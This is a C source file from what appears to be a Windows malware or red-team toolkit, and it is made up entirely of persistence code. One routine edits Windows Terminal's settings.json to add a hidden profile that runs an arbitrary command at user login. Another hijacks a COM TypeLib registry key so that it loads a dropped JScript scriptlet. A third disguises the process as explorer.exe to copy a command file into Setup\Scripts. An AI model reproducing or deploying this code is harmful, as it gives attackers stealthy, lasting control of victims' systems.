#include "pch.h"

LPWSTR WTFindSettingPath(VOID)
{
	WCHAR lpLocalAppData[MAX_PATH];
	DWORD cbLocalAppData;
	LPWSTR lpResult = NULL;
	LPWSTR* PathList = NULL;

	RtlSecureZeroMemory(lpLocalAppData, sizeof(lpLocalAppData));
	if (ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Packages", lpLocalAppData, MAX_PATH) >= MAX_PATH) {
		goto CLEANUP;
	}

	PathList = ListFileWithFilter(lpLocalAppData, L"Microsoft.WindowsTerminal_*", LIST_JUST_FOLDER, NULL);
	if (PathList == NULL) {
		goto CLEANUP;
	}

	lpResult = DuplicateStrW(PathList[0], lstrlenW(L"\\LocalState\\settings.json"));
	lstrcatW(lpResult, L"\\LocalState\\settings.json");
CLEANUP:
	FREE(PathList);

	return lpResult;
}

BOOL WTChangeSettingsFile
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	DWORD dwInsertedPoint = 0;
	LPSTR lpGuid = NULL;
	LPSTR lpInsertedStr = NULL;
	DWORD cbInsertedStr = 0;
	LPSTR lpDoulbeSlashPath = NULL;
	LPSTR lpRandomStr = NULL;
	LPSTR lpNewJsonData = NULL;
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpGuid = GenGUIDStrA();
	if (lpGuid == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	lpRandomStr = GenRandomStr(6);
	lpInsertedStr = DuplicateStrA("            {\n                \"commandline\": \"", 0);
	lpInsertedStr = StrCatExA(lpInsertedStr, lpDoulbeSlashPath);
	lpInsertedStr = StrCatExA(lpInsertedStr, "\",\n                \"guid\": \"");
	lpInsertedStr = StrCatExA(lpInsertedStr, lpGuid);
	lpInsertedStr = StrCatExA(lpInsertedStr, "\",\n                \"hidden\": true,\n                \"name\": \"");
	lpInsertedStr = StrCatExA(lpInsertedStr, lpRandomStr);
	lpInsertedStr = StrCatExA(lpInsertedStr, "\"\n            },\n");
	dwInsertedPoint = StrStrA(lpJsonData, "\n    \"profiles\": \n") - lpJsonData + lstrlenA("\n    \"profiles\": \n");
	dwInsertedPoint = StrStrA(lpJsonData + dwInsertedPoint, "\n        \"list\": \n        [\n") - lpJsonData + lstrlenA("\n        \"list\": \n        [\n");
	lpNewJsonData = StrInsertA(lpJsonData, lpInsertedStr, dwInsertedPoint);
	dwInsertedPoint = StrStrA(lpNewJsonData, "\n    \"defaultProfile\": \"") - lpNewJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	memcpy(lpNewJsonData + dwInsertedPoint, lpGuid, lstrlenA(lpGuid));
	lpTemp = StrStrA(lpNewJsonData, "\n    \"startOnUserLogin\": ");
	if (lpTemp) {
		dwInsertedPoint = lpTemp - lpNewJsonData + lstrlenA("\n    \"startOnUserLogin\": ");
		if (!IsStrStartsWithA(lpNewJsonData + dwInsertedPoint, "true")) {
			lpTemp = StrReplaceA(lpNewJsonData + dwInsertedPoint, "false", "true", FALSE, 1);
			lpNewJsonData[dwInsertedPoint] = '\0';
			lstrcatA(lpNewJsonData, lpTemp);
			FREE(lpTemp);
		}
	}
	else {
		dwInsertedPoint += lstrlenA(lpGuid) + 3;
		lpTemp = StrInsertA(lpNewJsonData, "    \"startOnUserLogin\": true,\n", dwInsertedPoint);
		FREE(lpNewJsonData);
		lpNewJsonData = lpTemp;
	}

	WriteToFile(lpPath, lpNewJsonData, lstrlenA(lpNewJsonData));
	Result = TRUE;
CLEANUP:
	FREE(lpGuid);
	FREE(lpDoulbeSlashPath);
	FREE(lpNewJsonData);
	FREE(lpRandomStr);
	FREE(lpJsonData);
	FREE(lpInsertedStr);

	return Result;
}

BOOL WTIsPersistenceExist
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	LPSTR lpDoulbeSlashPath = NULL;
	DWORD dwPos = 0;
	CHAR szGUID[39];
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	if (!StrStrA(lpJsonData, lpDoulbeSlashPath)) {
		goto CLEANUP;
	}

	if (!StrStrA(lpJsonData, "\n    \"startOnUserLogin\": true")) {
		goto CLEANUP;
	}

	dwPos = StrStrA(lpJsonData, "\n    \"defaultProfile\": \"") - lpJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	RtlSecureZeroMemory(szGUID, sizeof(szGUID));
	memcpy(szGUID, lpJsonData + dwPos, 38);
	lpTemp = StrStrA(lpJsonData, "\n        \"list\": \n        [\n");
	if (!lpTemp) {
		goto CLEANUP;
	}

	lpTemp = StrStrA(lpJsonData, lpDoulbeSlashPath) + lstrlenA(lpDoulbeSlashPath) + lstrlenA("\",\n                \"guid\": \"");
	if (memcmp(lpTemp, szGUID, lstrlenA(szGUID))) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(lpJsonData);
	FREE(lpDoulbeSlashPath);

	return Result;
}

BOOL WTStartPersistence
(
	_In_ LPSTR lpCommandLine
)
{
	LPWSTR lpSettingsPath = NULL;
	BOOL Result = FALSE;

	lpSettingsPath = WTFindSettingPath();
	if (lpSettingsPath == NULL) {
		goto CLEANUP;
	}

	if (!WTIsPersistenceExist(lpSettingsPath, lpCommandLine)) {
		WTChangeSettingsFile(lpSettingsPath, lpCommandLine);
	}

	Result = TRUE;
CLEANUP:
	FREE(lpSettingsPath);

	return Result;
}

BOOL PersistenceMethod2
(
	_In_ LPSTR lpCommandLine,
	_In_ PGLOBAL_CONFIG pConfig
)
{
	CHAR szTypeLibPath[] = "SOFTWARE\\Classes\\TypeLib\\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}";
	LSTATUS Status = ERROR_SUCCESS;
	HKEY hKey = NULL;
	HKEY hTypeLibHkey = NULL;	
	HKEY hWin64 = NULL;
	HKEY hWin32 = NULL;
	HKEY hZero = NULL;
	BOOL Result = FALSE;
	LPSTR lpSctContent = NULL;
	LPSTR lpSctPath = NULL;
	LPSTR lpDefaultValue = NULL;
	LPWSTR lpTempPath = NULL;
	LPSTR lpReformatedCommand = NULL;
	LPSTR lpReformatedPath = NULL;
	DWORD dwLastError = ERROR_SUCCESS;

	Status = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hKey, "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\\1.1\\0", 0, NULL, 0, KEY_WRITE, NULL, &hTypeLibHkey, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hTypeLibHkey, "win64", 0, NULL, 0, KEY_WRITE, NULL, &hWin64, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hTypeLibHkey, "win32", 0, NULL, 0, KEY_WRITE, NULL, &hWin32, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	lpReformatedCommand = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	if (lpReformatedCommand == NULL) {
		goto CLEANUP;
	}

	lpSctPath = ALLOC(MAX_PATH);
	lpSctPath = ConvertWcharToChar(pConfig->lpScriptPath);
	lpReformatedPath = StrReplaceA(lpSctPath, "\\", "\\\\", TRUE, 0);
	lpSctPath = StrCatExA(lpSctPath, "\\log.sct");

	lpSctContent = DuplicateStrA("<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\")\n            var fso = new ActiveXObject(\"Scripting.FileSystemObject\")\n            var logiPath = WShell.ExpandEnvironmentStrings(\"", 0);
	lpSctContent = StrCatExA(lpSctContent, lpReformatedPath);
	lpSctContent = StrCatExA(lpSctContent, "\")\n            if (fso.FolderExists(logiPath)) {\n                var folder = fso.GetFolder(logiPath)\n                var files = folder.Files\n                var run = true\n                for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {\n                    item = objEnum.item();\n                    if (item.Name.search(\".txt\") != -1) {\n                        fullName = logiPath + \"\\\\\" + item.Name\n                        try {\n                            var reader = fso.OpenTextFile(fullName, 1, true, 0)\n                        }\n                        catch (err) {\n                            run = false\n                            break\n                        }\n                    }\n                }\n\n                if (run) {\n                    WShell.Run(\"");
	lpSctContent = StrCatExA(lpSctContent, lpReformatedCommand);
	lpSctContent = StrCatExA(lpSctContent, "\")\n                }\n            }\n        ]]>\n    </script>\n</scriptlet>");
	lpTempPath = ConvertCharToWchar(lpSctPath);
	if (!WriteToFile(lpTempPath, lpSctContent, lstrlenA(lpSctContent))) {
		goto CLEANUP;
	}

	lpDefaultValue = DuplicateStrA("script:", lstrlenA(lpSctPath));
	lstrcatA(lpDefaultValue, lpSctPath);
	Status = RegSetValueA(hWin64, NULL, REG_SZ, lpDefaultValue, lstrlenA(lpSctPath));
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueA", Status);
		goto CLEANUP;
	}

	Status = RegSetValueA(hWin32, NULL, REG_SZ, lpDefaultValue, lstrlenA(lpSctPath));
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueA", Status);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (hTypeLibHkey != NULL) {
		RegCloseKey(hTypeLibHkey);
	}

	if (hWin64 != NULL) {
		RegCloseKey(hWin64);
	}

	if (hWin32 != NULL) {
		RegCloseKey(hWin32);
	}

	FREE(lpSctPath);
	FREE(lpTempPath);
	FREE(lpDefaultValue);
	FREE(lpSctContent);
	FREE(lpReformatedCommand);
	FREE(lpReformatedPath);

	return Result;
}

BOOL PersistenceMethod1
(
	_In_ LPSTR lpCommandLine
)
{
	BOOL Result = FALSE;
	WCHAR wszWindowsPath[MAX_PATH];
	LPWSTR lpTempPath = NULL;
	BOOL CreateTempFile = FALSE;
	WCHAR wszExplorerPath[MAX_PATH];
	LPWSTR OldPath[5];
	WCHAR wszNullStr[0x10];
	BOOL RestoreProcessPath = FALSE;

	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
	SecureZeroMemory(OldPath, sizeof(OldPath));
	GenerateTempPathW(L"ErrorHandler.cmd", NULL, NULL, &lpTempPath);
	GetWindowsDirectoryW(wszWindowsPath, _countof(wszWindowsPath));
	lstrcatW(wszWindowsPath, L"\\Setup\\Scripts");
	if (!WriteToFile(lpTempPath, lpCommandLine, lstrlenA(lpCommandLine))) {
		goto CLEANUP;
	}

	CreateTempFile = TRUE;
	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
	lstrcatW(wszExplorerPath, L"\\explorer.exe");
	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
	RestoreProcessPath = TRUE;
	if (!MasqueradedMoveCopyDirectoryFileCOM(lpTempPath, wszWindowsPath, FALSE)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (RestoreProcessPath) {
		MasqueradeProcessPath(NULL, TRUE, OldPath);
	}

	if (IsFileExist(lpTempPath)) {
		DeleteFileW(lpTempPath);
	}

	if (lpTempPath != NULL) {
		FREE(lpTempPath);
	}

	return Result;
}